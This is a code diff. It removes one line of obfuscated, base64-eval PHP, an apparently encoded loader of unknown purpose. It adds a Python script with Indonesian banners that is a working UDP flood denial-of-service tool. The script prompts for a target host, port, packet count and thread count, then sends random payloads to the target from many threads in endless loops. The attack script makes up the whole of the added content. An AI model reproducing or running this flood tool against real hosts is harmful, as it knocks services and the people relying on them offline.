@@ -1,1 +1,63 @@
-<?php /*** PHP Encode v1.0 by zeura.com ***/ $XnNhAWEnhoiqwciqpoHH=file(__FILE__);eval(base64_decode("aWYoIWZ1bmN0aW9uX2V4aXN0cygiWWl1bklVWTc2YkJodWhOWUlPOCIpKXtmdW5jdGlvbiBZaXVuSVVZNzZiQmh1aE5ZSU84KCRnLCRiPTApeyRhPWltcGxvZGUoIlxuIiwkZyk7JGQ9YXJyYXkoNjU1LDIzNiw0MCk7aWYoJGI9PTApICRmPXN1YnN0cigkYSwkZFswXSwkZFsxXSk7ZWxzZWlmKCRiPT0xKSAkZj1zdWJzdHIoJGEsJGRbMF0rJGRbMV0sJGRbMl0pO2Vsc2UgJGY9dHJpbShzdWJzdHIoJGEsJGRbMF0rJGRbMV0rJGRbMl0pKTtyZXR1cm4oJGYpO319"));eval(base64_decode(YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH)));eval(ZsldkfhGYU87iyihdfsow(YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH,2),YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH,1)));__halt_compiler();aWYoIWZ1bmN0aW9uX2V4aXN0cygiWnNsZGtmaEdZVTg3aXlpaGRmc293Iikpe2Z1bmN0aW9uIFpzbGRrZmhHWVU4N2l5aWhkZnNvdygkYSwkaCl7aWYoJGg9PXNoYTEoJGEpKXtyZXR1cm4oZ3ppbmZsYXRlKGJhc2U2NF9kZWNvZGUoJGEpKSk7fWVsc2V7ZWNobygiRXJyb3I6IEZpbGUgTW9kaWZpZWQiKTt9fX0=cc82ed9d8ef23aeb341664c3677edf12d65acea2zVXdatswFL6Owe9wahiVmXH/LxoIQ226NqRLS+MyRjeKZ6uJaGwZS6E17CIXuegDlO1+r7I36ZNMsmzH7bws7GYLIZLOOd/5+aRzQqOEpQJSPw5ZZBpUHzkLbomojow7POPVUYxT4oc0Hi0kNCKmYRpJSmOBLMv6uLmzc7W/FUHj5z2+GPQGx2tra6bR7Z3iCzw4BnxwOTwC7+zsdOhA/8jDJ5d4UEhxX26H+AOGE3x+OZQB7CpYHmozeinZ340OWUjgIIPTTBYXwxc48Ec+Xwr1pvFoNIU96BJBb+GQZa5pqOpcPiEkQXu2KpNxV/IhSISsYEL8tOagLH1PkgkeYxOuMmgXOUgZgGk8fX34J98i8vzpcaZ+FxoteajJtWT2i321nxfa6vg4WwKsai6sHkqTpnQqT9JmYV/DLpJtkj8HqshVxvNa6rPVjrOlwPkS4O9eKU2gA1ykiMbJVKqunmbfP8EJ42Kjl7TBshVKdVUHFPSZ1bmUFybBmNGANLnqhoxDX771NyjbiO3CXr1i3ujTV83OS7O8uRsNPa0qDJuaICQ3cEc/T5HdNo1WqPLoFLPFvZ7qDdra3FZt1KILna4FFYEs58WqwrXuxnRCwEunRPluiTTL15YKoeeVqxdUnPDb697gyHNK7fDssH/dPb7A7+wc6IdhKrEo5y+xHVWv4t3W6huWwr0kQeU4Iiinz9YhW7J0EoeCIVWioxxpjL5sCq8tKMdAOX2wEJJneMXzO5SrBa9kWGcRkdwHJBHtmqNqjF79+Cavld3FcmRa+Qgqmd7+E9W7/wPV3A1YHJNAoOclF0TmNK7Kes24RvdfsSzTmjBOkL0a5yq3rJabboc8O3oDZT92YD1b17yNJV/Vn6Wr2wcJPx0R1dzq+mxt53IpFcheEbX9AvYT
+import random
+import socket
+import os,sys
+import threading
+import time
+
+print("""\033[91m                      WARNING!!!
+DILARANG ABUSE TOOLS, KETAHUAN ABUSE AKAN SAYA HAPUS""")
+print("\033[0m")
+print("\033[94mCode By Lyndon | Bagas")
+print("\033[0m")
+print("Tunggu 5 Detik Coy.
+time.sleep(5)
+
+os.system("clear")
+print("""\033[95m
+ Tools By : Lyndon
+   
+████████████████████████████████████████
+█▄─▄███▄─█─▄█▄─▀█▄─▄█▄─▄▄▀█─▄▄─█▄─▀█▄─▄█
+██─██▀██▄─▄███─█▄▀─███─██─█─██─██─█▄▀─██
+▀▄▄▄▄▄▀▀▄▄▄▀▀▄▄▄▀▀▄▄▀▄▄▄▄▀▀▄▄▄▄▀▄▄▄▀▀▄▄▀""")
+print("\033[0m")
+ip = str(input("[•] Host/Ip: "))
+port = int(input("[•] Port: "))
+choice = str(input("[•] Ddos Kaga?(y/n): "))
+times = int(input("[•] Packets: "))
+threads = int(input("[•] Threads: "))
+os.system("clear")
+def wibu():
+	ddos = random._urandom(1025)
+	i = random.choice(("[•]","[•]","[•]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(ddos,addr)
+			print(i +" \033[95m Lyndon Attack %s Port %s" %(ip,port))
+		except:
+			print("\033[91m[×] Down!!!")
+
+def wibu2():
+	ddos = random._urandom(1024)
+	i = random.choice(("[•]","[•]","[•]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			s.connect((ip,port))
+			s.send(ddos)
+			for x in range(times):
+				s.send(ddos)
+			print(i +" Lyndon Attack %s Port %s" %(ip,port))
+		except:
+			s.close()
+			print("\033[91m[×] Down!!!")
+
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = wibu)
+		th.start()
+		th = threading.Thread(target = wibu2)
+		th.start()			
